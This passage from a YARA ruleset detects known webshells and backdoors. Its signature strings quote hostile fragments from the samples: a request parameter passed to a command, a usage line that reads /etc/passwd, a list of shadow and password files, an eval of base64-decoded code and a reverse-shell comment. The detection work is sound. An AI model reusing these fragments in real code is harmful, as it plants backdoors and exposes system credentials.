$port\\\");\" \n   condition: \n      1 of them\n}\n\nrule Webshell_sql_php_php_RID2F44 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file sql.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"fputs ($fp, \\\"# RST MySQL tools\\\\r\\\\n# Home page: http://rst.void.ru\\\\r\\\\n#\" \n      $s2 = \"http://rst.void.ru\" \n      $s3 = \"print \\\"<a href=\\\\\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&\" \n   condition: \n      1 of them\n}\n\nrule Webshell_telnetd_pl_RID2ED1 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file telnetd.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:30:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"0ldW0lf\" fullword\n      $s1 = \"However you are lucky :P\" \n      $s2 = \"I'm FuCKeD\" \n      $s3 = \"ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#\" \n      $s4 = \"atrix@irc.brasnet.org\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Java_Shell_js_RID2FBB : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Java Shell.js.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"PySystemState.initialize(System.getProperties(), null, argv);\" fullword\n      $s3 = \"public class JythonShell extends JPanel implements Runnable {\" fullword\n      $s4 = \"public static int DEFAULT_SCROLLBACK = 100\" \n   condition: \n      2 of them\n}\n\nrule Webshell_STNC_php_php_RID2F2C : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file STNC.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"drmist.ru\" fullword\n      $s1 = \"hidden(\\\"action\\\",\\\"download\\\").hidden_pwd().\\\"<center><table><tr><td width=80\" \n      $s2 = \"STNC WebShell\" \n      $s3 = \"http://www.security-teams.net/index.php?showtopic=\" \n   condition: \n      1 of them\n}\n\nrule Webshell_aZRaiLPhp_v1_0_php_RID312D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file aZRaiLPhp v1.0.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:11:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"azrailphp\" \n      $s1 = \"<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>\" \n      $s3 = \"<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>\" \n   condition: \n      2 of them\n}\n\nrule Webshell_Moroccan_Spamers_Ma_EditioN_By_GhOsT_php_RID3A0F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 19:30:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \";$sd98=\\\"john.barker446@gmail.com\\\"\" \n      $s1 = \"print \\\"Sending mail to $to....... \\\";\" \n      $s2 = \"<td colspan=\\\"2\\\" width=\\\"715\\\" background=\\\"/simparts/images/cellpic1.gif\\\" hei\" \n   condition: \n      1 of them\n}\n\nrule Webshell_simple_backdoor_php_RID327B : DEMO T1087_001 T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file simple-backdoor.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:07:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1087_001, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$cmd = ($_REQUEST['cmd']);\" fullword\n      $s1 = \"<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->\" \n      $s2 = \"Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_Dive_Shell_1_0___Emperor_Hacking_Team_php_RID3A3C : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Dive Shell 1.0 - Emperor Hacking Team.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 19:37:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Emperor Hacking TEAM\" \n      $s1 = \"Simshell\" fullword\n      $s2 = \"ereg('^[[:blank:]]*cd[[:blank:]]\" \n      $s3 = \"<form name=\\\"shell\\\" action=\\\"<?php echo $_SERVER['PHP_SELF'] ?>\\\" method=\\\"POST\" \n   condition: \n      2 of them\n}\n\nrule Webshell_telnet_cgi_RID2EC4 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file telnet.cgi.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"W A R N I N G: Private Server\" \n      $s2 = \"print \\\"Set-Cookie: SAVEDPWD=;\\\\n\\\"; # remove password cookie\" \n      $s3 = \"$Prompt = $WinNT ? \\\"$CurrentDir> \\\" : \\\"[admin\\\\@$ServerName $C\" \n   condition: \n      1 of them\n}\n\nrule Webshell_ironshell_php_RID301D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file ironshell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:26:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"www.ironwarez.info\" \n      $s1 = \"$cookiename = \\\"wieeeee\\\";\" \n      $s2 = \"~ Shell I\" \n      $s3 = \"www.rootshell-team.info\" \n      $s4 = \"setcookie($cookiename, $_POST['pass'], time()+3600);\" \n   condition: \n      1 of them\n}\n\nrule Webshell_backdoorfr_php_RID306A : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file backdoorfr.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan\" \n      $s2 = \"print(\\\"<br>Provenance du mail : <input type=\\\\\\\"text\\\\\\\" name=\\\\\\\"provenanc\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Asmodeus_v0_1_pl_RID30B7 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Asmodeus v0.1.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[url=http://www.governmentsecurity.org\" \n      $s1 = \"perl asmodeus.pl client 6666 127.0.0.1\" \n      $s2 = \"print \\\"Asmodeus Perl Remote Shell\" \n      $s4 = \"$internet_addr = inet_aton(\\\"$host\\\") or die \\\"ALOA:$!\\\\n\\\";\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_backup_php_often_with_c99shell_RID36A5 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file backup.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 17:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"#phpMyAdmin MySQL-Dump\" fullword\n      $s2 = \";db_connect();header('Content-Type: application/octetstr\" \n      $s4 = \"$data .= \\\"#Database: $database\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_phpshell17_php_RID3015 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file phpshell17.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:24:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input name=\\\"submit_btn\\\" type=\\\"submit\\\" value=\\\"Execute Command\\\"></p>\" fullword\n      $s1 = \"<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></\" \n      $s2 = \"href=\\\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_myshell_php_php_RID30F2 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file myshell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:01:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@chdir($work_dir) or ($shellOutput = \\\"MyShell: can't change directory.\" \n      $s1 = \"echo \\\"<font color=$linkColor><b>MyShell file editor</font> File:<font color\" \n      $s2 = \" $fileEditInfo = \\\"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$\" \n   condition: \n      2 of them\n}\n\nrule Webshell_SimShell_1_0___Simorgh_Security_MGZ_php_RID3987 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file SimShell 1.0 - Simorgh Security MGZ.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 19:07:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Simorgh Security Magazine \" \n      $s1 = \"Simshell.css\" \n      $s2 = \"} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], \" \n      $s3 = \"www.simorgh-ev.com\" \n   condition: \n      2 of them\n}\n\nrule Webshell_rootshell_php_RID3029 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file rootshell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:28:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"shells.dl.am\" \n      $s1 = \"This server has been infected by $owner\" \n      $s2 = \"<input type=\\\"submit\\\" value=\\\"Include!\\\" name=\\\"inc\\\"></p>\" \n      $s4 = \"Could not write to file! (Maybe you didn't enter any text?)\" \n   condition: \n      2 of them\n}\n\nrule Webshell_aspydrv_asp_RID2F52 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file aspydrv.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:52:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))\" \n      $s1 = \"password\" \n      $s2 = \"session(\\\"shagman\\\")=\" \n   condition: \n      2 of them\n}\n\nrule Webshell_Ajan_asp_RID2DC3 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Ajan.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 10:45:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\downloaded.zip\" \n      $s2 = \"Set entrika = entrika.CreateTextFile(\\\"c:\\\\net.vbs\\\", True)\" fullword\n      $s3 = \"http://www35.websamba.com/cybervurgun/\" \n   condition: \n      1 of them\n}\n\nrule Webshell_PHANTASMA_php_RID2EEA : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file PHANTASMA.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:34:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \">[*] Safemode Mode Run</DIV>\" \n      $s1 = \"$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>\" \n      $s2 = \"[*] Spawning Shell\" \n      $s3 = \"Cha0s\" \n   condition: \n      2 of them\n}\n\nrule Webshell_connectback2_pl_RID308E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file connectback2.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   \" \n      $s1 = \"echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel\" \n      $s2 = \"ConnectBack Backdoor\" \n   condition: \n      1 of them\n}\n\nrule Webshell_DefaceKeeper_0_2_php_RID3201 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file DefaceKeeper_0.2.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"target fi1e:<br><input type=\\\"text\\\" name=\\\"target\\\" value=\\\"index.php\\\"></br>\" fullword\n      $s1 = \"eval(base64_decode(\\\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9\" \n      $s2 = \"<img src=\\\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\\\" align=\\\"center\" \n   condition: \n      1 of them\n}\n\nrule Webshell_s72_Shell_v1_1_Coding_html_RID3436 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file s72 Shell v1.1 Coding.html.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:20:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Dizin</font></b></font><font face=\\\"Verdana\\\" style=\\\"font-size: 8pt\\\"><\" \n      $s1 = \"s72 Shell v1.0 Codinf by Cr@zy_King\" \n      $s3 = \"echo \\\"<p align=center>Dosya Zaten Bulunuyor</p>\\\"\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Antichat_Socks5_Server_php_php_RID368D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Antichat Socks5 Server.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 17:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);\" fullword\n      $s3 = \"#   [+] Domain name address type\" \n      $s4 = \"www.antichat.ru\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php_RID3A0D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 19:30:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\" \n      $s1 = \"Mode Shell v1.0</font></span>\" \n      $s2 = \"has been already loaded. PHP Emperor <xb5@hotmail.\" \n   condition: \n      1 of them\n}\n\nrule Webshell_mysql_php_php_RID302A : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file mysql.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:28:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"action=mysqlread&mass=loadmass\\\">load all defaults\" \n      $s2 = \"if (@passthru($cmd)) { echo \\\" -->\\\"; $this->output_state(1, \\\"passthru\" \n      $s3 = \"$ra44  = rand(1,99999);$sj98 = \\\"sh-$ra44\\\";$ml = \\\"$sd98\\\";$a5 = \" \n   condition: \n      1 of them\n}\n\nrule Webshell_Worse_Linux_Shell_php_RID3323 : DEMO LINUX SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Worse Linux Shell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:35:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, LINUX, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"print \\\"<tr><td><b>Server is:</b></td><td>\\\".$_SERVER['SERVER_SIGNATURE'].\\\"</td\" \n      $s2 = \"print \\\"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\\\\\"_cmd\" \n   condition: \n      1 of them\n}\n\nrule Webshell_cyberlords_sql_php_php_RID33DC : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file cyberlords_sql.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:05:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Coded by n0 [nZer0]\" \n      $s1 = \" www.cyberlords.net\" \n      $s2 = \"U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE\" \n      $s3 = \"return \\\"<BR>Dump error! Can't write to \\\".htmlspecialchars($file);\" \n   condition: \n      1 of them\n}\n\nrule Webshell_pws_php_php_RID2F4E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file pws.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<div align=\\\"left\\\"><font size=\\\"1\\\">Input command :</font></div>\" fullword\n      $s1 = \"<input type=\\\"text\\\" name=\\\"cmd\\\" size=\\\"30\\\" class=\\\"input\\\"><br>\" fullword\n      $s4 = \"<input type=\\\"text\\\" name=\\\"dir\\\" size=\\\"30\\\" value=\\\"<? passthru(\\\"pwd\\\"); ?>\" \n   condition: \n      2 of them\n}\n\nrule Webshell_PHP_Shell_php_php_RID3133 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file PHP Shell.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:12:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"</form><form action=\\\\\\\"$SFileName?$urlAdd\\\\\\\" method=\\\\\\\"post\\\\\\\"><input\" \n      $s1 = \"echo \\\"<form action=\\\\\\\"$SFileName?$urlAdd\\\\\\\" method=\\\\\\\"POST\\\\\\\"><input type=\" \n   condition: \n      all of them\n}\n\nrule Webshell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html_RID39CD : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 19:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Ayyildiz\" \n      $s1 = \"TouCh By iJOo\" \n      $s2 = \"First we check if there has been asked for a working directory\" \n      $s3 = \"http://ayyildiz.org/images/whosonline2.gif\" \n   condition: \n      2 of them\n}\n\nrule Webshell_Ajax_PHP_Command_Shell_php_RID348D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Ajax_PHP Command Shell.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:35:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>\" \n      $s2 = \"Empty Command..type \\\\\\\"shellhelp\\\\\\\" for some ehh...help\" \n      $s3 = \"newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct\" \n   condition: \n      1 of them\n}\n\nrule Webshell_JspWebshell_1_2_jsp_RID31D6 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file JspWebshell 1.2.jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:39:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"JspWebshell\" \n      $s1 = \"CreateAndDeleteFolder is error:\" \n      $s2 = \"<td width=\\\"70%\\\" height=\\\"22\\\">&nbsp;<%=env.queryHashtable(\\\"java.c\" \n      $s3 = \"String _password =\\\"111\\\";\" \n   condition: \n      2 of them\n}\n\nrule Webshell_Phyton_Shell_py_RID30C7 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Phyton Shell.py.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:54:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sh_out=os.popen(SHELL+\\\" \\\"+cmd).readlines()\" fullword\n      $s2 = \"#   d00r.py 0.3a (reverse|bind)-shell in python by fQ\" fullword\n      $s3 = \"print \\\"error; help: head -n 16 d00r.py\\\"\" fullword\n      $s4 = \"print \\\"PW:\\\",PW,\\\"PORT:\\\",PORT,\\\"HOST:\\\",HOST\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_mysql_tool_php_php_RID3247 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file mysql_tool.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:58:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$error_text = '<strong>Failed selecting database \\\"'.$this->db['\" \n      $s1 = \"$ra44  = rand(1,99999);$sj98 = \\\"sh-$ra44\\\";$ml = \\\"$sd98\\\";$a5 = $_SERV\" \n      $s4 = \"<div align=\\\"center\\\">The backup process has now started<br \" \n   condition: \n      1 of them\n}\n\nrule Webshell_sh_php_php_RID2ECF : DEMO SCRIPT T1087_001 T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file sh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:30:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1087_001, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e\" \n      $s2 = \"Show <input type=text size=5 value=\\\".((isset($_POST['br_st']))?$_POST['br_st']:\" \n   condition: \n      1 of them\n}\n\nrule Webshell_phpbackdoor15_php_RID3140 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file phpbackdoor15.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:14:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, 